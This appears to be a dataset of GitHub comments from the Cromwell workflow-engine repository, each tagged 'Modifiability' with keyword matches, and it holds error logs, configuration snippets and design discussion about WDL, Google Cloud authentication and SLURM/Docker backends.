Modifiability,"()); 	}; }; ```; error log; ```; $ java -jar /users/leepc12/code/cromwell/./target/scala-2.12/cromwell-31-d716fd2-SNAP.jar run test_conditionals_in_cromwell-30.wdl; Picked up _JAVA_OPTIONS: -Xms256M -Xmx1024M -XX:ParallelGCThreads=1; [2017-12-05 20:11:15,13] [info] Running with database db.url = jdbc:hsqldb:mem:7e58cfd2-b9b6-47f9-bda1-6fe045e7a665;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 20:11:21,83] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2017-12-05 20:11:21,84] [info] [RenameWorkflowOptionsInMetadata] 100%; [2017-12-05 20:11:22,02] [info] Running with database db.url = jdbc:hsqldb:mem:e02f9206-cb15-468a-929a-82676a83a9b8;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 20:11:22,47] [info] Slf4jLogger started; [2017-12-05 20:11:22,67] [info] Metadata summary refreshing every 2 seconds.; [2017-12-05 20:11:22,68] [info] Starting health monitor with the following checks: DockerHub, Engine Database; [2017-12-05 20:11:22,69] [info] WriteMetadataActor configured to write to the database with batch size 200 and flush rate 5 seconds.; [2017-12-05 20:11:22,71] [info] CallCacheWriteActor configured to write to the database with batch size 100 and flush rate 3 seconds.; [2017-12-05 20:11:23,78] [info] SingleWorkflowRunnerActor: Submitting workflow; [2017-12-05 20:11:23,82] [info] Workflow 159210e6-fa6a-4a99-b386-5931ae245324 submitted.; [2017-12-05 20:11:23,82] [info] SingleWorkflowRunnerActor: Workflow submitted 159210e6-fa6a-4a99-b386-5931ae245324; [2017-12-05 20:11:23,82] [info] 1 new workflows fetched; [2017-12-05 20:11:23,82] [info] WorkflowManagerActor Starting workflow 159210e6-fa6a-4a99-b386-5931ae245324; [2017-12-05 20:11:23,83] [info] WorkflowManagerActor Successfully started WorkflowActor-159210e6-fa6a-4a99-b386-5931ae245324; [2017-12-05 20:11:23,83] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2017-12-05 20:11:24,82] [error] WorkflowManagerActor Workflow 159210e6-fa6a-4a9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406:1593,config,configured,1593,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406,1,['config'],['configured']
Modifiability,"(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; ```; I had set up my credentials with:; ```; export GOOGLE_APPLICATION_CREDENTIALS=sa.json; ```; and had this configuration in `google.conf` copied from the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/):; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }; ```; That clearly did not work. I tried to follow the logic in this post. I followed Horneth suggestion to use `service-account`'s authorization and I took the [auths](https://cromwell.readthedocs.io/en/develop/backends/Google/) configuration and changed `pem-file` to `json-file` in `google.conf` as follows:; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""service_account""; scheme = ""service_account""; service-account-id = ""xxx@xxx.iam.gserviceaccount.com""; json-file = ""sa.json""; }; ]; }. engine {; filesystems {; gcs {; auth = ""service_account""; project = ""xxx""; }; }; }; ```; And I have replaced every other instance of `auth = ""application-default""` with `auth = ""service_account""`. Now when I run Cromwell:; ```; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```; I don't get the error anymore. I do get a different error:; ```; [2020-07-27 22:54:56,48] [info] WorkflowManagerActor Workflow 0fb5e69d-7d70-407e-9fe2-bf7cb2b2c3e6 failed (during ExecutingWorkflowState): java.lang.Exception: Task wf_hello.hello:NA:1 failed. The job was stopped before the command finished. PAPI error code 7. Required 'compute.zones.list' permission for 'projects/xxx'; ```; I don't know what this m",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906:1254,config,configuration,1254,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906,1,['config'],['configuration']
Modifiability,"* This actually has been officially removed from the draft-3 spec on account of it never being implemented by any engine.; * The read_json and write_json (and structs in draft-3) will hopefully ease a lot of the annoyances you're finding here (it's been known to be annoying, we're just finally able to put resources towards easing it now); * All WDL values are immutable as an early design choice for the language. Think of them less as variables in an imperative language and more as write-once declarations in a DAG (ie an execution graph). Say some subsequent task uses (edit: ~~len~~) `i` in your example above. If values are mutable then how can Cromwell know when it's safe to use the value? If you force all tasks to complete before anything after them starts then one slow task cannot run in parallel with several fast tasks.; * I think what you really want is some kind of list comprehension (eg equivalent to python's `[x + 1 for x in x_list]`). You can get something similar by using the implicit gather on a scatter. eg I could map over an array to calculate the ""values plus one"" array like this:; ```wdl; workflow foo {; Array[Int] input_array; scatter(i in input_array) {; plus_ones = i + 1; }; Array[Int] input_array_plus_ones = plus_ones # gathers the results from the plus-one'ing; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367445161:438,variab,variables,438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367445161,1,['variab'],['variables']
Modifiability,**I** disagree because that's going to make the workflow potentially non-portable,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420764422:73,portab,portable,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420764422,1,['portab'],['portable']
Modifiability,"**TL;DR Discussed in person with @ruchim. Going to 👍 , and perhaps dev choice a PR to change the syntax, using a secondary route that looks for `workflowInputs[]`.**. This current PR is very swagger spec friendly, using a fixed 2-based list of additional inputs:; - `workflowInputs`; - `workflowInputs_2`; - `workflowInputs_3`; - `workflowInputs_4`; - `workflowInputs_5`. Ideally we could use a PHP compatible syntax on a secondary spray route:; - `workflowInputs[]`; - `workflowInputs[]`; - `workflowInputs[]`; - etc. This array, using a [custom](https://groups.google.com/d/msg/spray-user/5kSZ87OnfkE/I_A_OcaIticJ) spray marshaller could be programmatically converted into an variable length `workflowInputs: Seq[String]`. Passing the sequence into the business logic would also allow storing the separated inputs in the metadata. For now the five inputs are merged into a single value in the web service and stored in the database as a merged clob. At this second I do not know if swagger would allow multiple form data elements with the same name. I'm assuming curl, HTTPie, and jvm clients such as spray-client would, as PHP supports the above syntax. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1511/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1511#issuecomment-251432342:678,variab,variable,678,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1511#issuecomment-251432342,1,['variab'],['variable']
Modifiability,"**TL;DR Use `sbt publish` to push all the non-fat jars, such as `cromwell-backend >>> _2.11-0.1 <<< .jar`, and do not custom upload the fat `cromwell-backend >>> -0.1 <<< .jar`.**. Via the sbt-assembly plugin [docs](https://github.com/sbt/sbt-assembly/tree/v0.14.1#publishing-not-recommended):. > Publishing fat JARs out to the world is discouraged because non-modular JARs cause much sadness. One might think non-modularity is convenience but it quickly turns into a headache the moment your users step outside of Hello World example code. The fat jars being generated for our sub-modules should ~~die in a fire~~ be removed via [`aggregate in assembly := false`](http://stackoverflow.com/a/30828390/3320205). Also be sure to clean out the proliferation in Settings.scala of `assemblyJarName in assembly` and the viral `val commonSettings = … ++ assemblySettings ++ …`. `assemblySettings` and `assemblyJarName` only belong in the `root`!. I have also buried the lede a bit. Our cromwell versioning is... _incomplete_ at the moment, depending on if ""Add backend jar"" means releases-only or releases-and-snapshots. While we could technically publish releases as is, we shouldn't really publish any snapshots until #645 is fixed, or downstream devs are gonna have a bad time as unhashed snapshots continuously change with each re-publish.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1019#issuecomment-227342208:202,plugin,plugin,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1019#issuecomment-227342208,1,['plugin'],['plugin']
Modifiability,"+1 on this :) I think the idea of `struct` would be very useful to potentially enhance/replace the Object type. May want the order of the type and variable name to be consistent with other WDL, e.g. instead of:. ```; struct MyType {; o_f: File; x: Array[String]; }; ```. ```; struct MyType {; File of; Array[String] x; }; ```. IMHO, the word `struct` is nice since it pays homage to C and it seems like a fairly nice correspondence. May want to consider `tuple` as well. Finally, I think a nice benefit of this is that it could have nice correspondence with records in CWL and thus potentially a nice representation in the WOM to handle both.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-327884056:79,enhance,enhance,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2283#issuecomment-327884056,2,"['enhance', 'variab']","['enhance', 'variable']"
Modifiability,"- Removed `prsalt.txt`.; - Added an sbt run configuration for `renderCiResources` and set the 'Cromwell server' configuration to invoke it before launching the server.; - The ""JDK of 'cromwell' module"" seemed like the least problematic choice of JDK; specifying particular patch levels and builds of JDK 11 seemed like it might not work out well as updates become available...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262:44,config,configuration,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322#issuecomment-827832262,2,['config'],['configuration']
Modifiability,"- Still need to add the new config options to the README; - Something in the tests is broken, still working on that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230785869:28,config,config,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230785869,1,['config'],['config']
Modifiability,"- Yes, does use private docker hub credentials.; - I took defaults otherwise. This was working fine yesterday. Did I need to re-authenticate?. On Wed, Nov 2, 2016 at 9:55 AM, kcibul notifications@github.com wrote:. > What authentication mode are you running in (default credentials, service; > account or refresh token)? Does your config make use of private dockerhub; > credentials; > ; > I'm wondering why it's writing an authorization at all.; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXk2yTbJKsspghDzPz2y5Tp7jKKmnNks5q6JY_gaJpZM4KnP3t; > . ## . Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257987410:331,config,config,331,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257987410,1,['config'],['config']
Modifiability,"-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 submitted; 2018-06-07 12:16:52,348 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - 1 new workflows fetched; 2018-06-07 12:16:52,349 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Starting workflow UUID(dd0b1399-ebb6-4d9b-89ea-7da193994220); 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Successfully started WorkflowActor-dd0b1399-ebb6-4d9b-89ea-7da193994220; 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); sca",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:98395,config,configured,98395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
Modifiability,"-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, which seems inappropriate. The following should have been used instead:; ```; sbatch \; -o ${out}.sbatch \; -e ${err}.sbatch \; ```; Similarly to how it is advised for [SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/) where `${out}.qsub` and `${err}.qsub` are used in place of `${out}` and `${err}`. The current workaround suggested by @honestAnt is instead to use in the Cromwell configuration file something like this:; ```; submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${docker_script}""; mv ${cwd}/execution/rc ${cwd}/execution/rc.tmp; sleep 60; mv ${cwd}/execution/rc.tmp ${cwd}/execution/rc; """"""; ```; A better alternative would be to use in the Cromwell configuration file something like this (as suggested [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/src/ci/resources/local_provider_config.inc.conf)):; ```; script-epilogue = ""sleep 60 && sync"". submit-docker = """"""; ...; sbatch \; --wait \; -J=${job_name} \; -D ${cwd} \; -o ${out}.sbatch \; -e ${err}.sbatch \; -t ${runtime_minutes} \; -c ${cpu} \; --mem=${memory_mb} \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cw",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:4251,config,configuration,4251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configuration']
Modifiability,"-Xms256M -Xmx1024M -XX:ParallelGCThreads=1; [2017-12-05 20:11:15,13] [info] Running with database db.url = jdbc:hsqldb:mem:7e58cfd2-b9b6-47f9-bda1-6fe045e7a665;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 20:11:21,83] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2017-12-05 20:11:21,84] [info] [RenameWorkflowOptionsInMetadata] 100%; [2017-12-05 20:11:22,02] [info] Running with database db.url = jdbc:hsqldb:mem:e02f9206-cb15-468a-929a-82676a83a9b8;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 20:11:22,47] [info] Slf4jLogger started; [2017-12-05 20:11:22,67] [info] Metadata summary refreshing every 2 seconds.; [2017-12-05 20:11:22,68] [info] Starting health monitor with the following checks: DockerHub, Engine Database; [2017-12-05 20:11:22,69] [info] WriteMetadataActor configured to write to the database with batch size 200 and flush rate 5 seconds.; [2017-12-05 20:11:22,71] [info] CallCacheWriteActor configured to write to the database with batch size 100 and flush rate 3 seconds.; [2017-12-05 20:11:23,78] [info] SingleWorkflowRunnerActor: Submitting workflow; [2017-12-05 20:11:23,82] [info] Workflow 159210e6-fa6a-4a99-b386-5931ae245324 submitted.; [2017-12-05 20:11:23,82] [info] SingleWorkflowRunnerActor: Workflow submitted 159210e6-fa6a-4a99-b386-5931ae245324; [2017-12-05 20:11:23,82] [info] 1 new workflows fetched; [2017-12-05 20:11:23,82] [info] WorkflowManagerActor Starting workflow 159210e6-fa6a-4a99-b386-5931ae245324; [2017-12-05 20:11:23,83] [info] WorkflowManagerActor Successfully started WorkflowActor-159210e6-fa6a-4a99-b386-5931ae245324; [2017-12-05 20:11:23,83] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2017-12-05 20:11:24,82] [error] WorkflowManagerActor Workflow 159210e6-fa6a-4a99-b386-5931ae245324 failed (during MaterializingWorkflowDescriptorState): Workflow input processing failed:; Unable to build WOM node for If '$if_2': Unable to build WOM node for Scatter '$s",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406:1728,config,configured,1728,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406,1,['config'],['configured']
Modifiability,". String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3823,config,config,3823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['config']
Modifiability,". task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill cat ${docker_cid}; }; }; java.lang.RuntimeException: Error parsing generated wdl:; task submit {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {; singularity run -B ${head_directory}:${head_directory} ${singularity_image} /bin/bash ${script}; }; }. task submit_docker {. String job_id; String job_name; String cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.con",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3236,config,configuration,3236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['config'],['configuration']
Modifiability,".scala:442); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.$anonfun$apply$51(WdlNamespace.scala:441); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); at wdl.draft2.model.WdlNamespace$.apply(WdlNamespace.scala:440); at wdl.draft2.model.WdlNamespace$.$anonfun$load$1(WdlNamespace.scala:174); at scala.util.Try$.apply(Try.scala:213); at wdl.draft2.model.WdlNamespace$.load(WdlNamespace.scala:169); at wdl.draft2.model.WdlNamespace$.loadUsingSource(WdlNamespace.scala:161); at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:53); ... 27 common frames omitted; [2020-09-17 21:41:46,29] [info] Not triggering log of token queue status. Effective log interval = None; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:8913,config,config,8913,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,3,"['Config', 'config']","['ConfigWdlNamespace', 'config']"
Modifiability,".scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; ```. I tried adding the [reference services block](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L480), but then I received yet another error: . ```; 2019-02-25 18:46:46,698 cromwell-system-akka.actor.default-dispatcher-3 ERROR - Class cromwell.services.womtool.i",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1554,config,config,1554,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:5448,config,config,5448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['config'],['config']
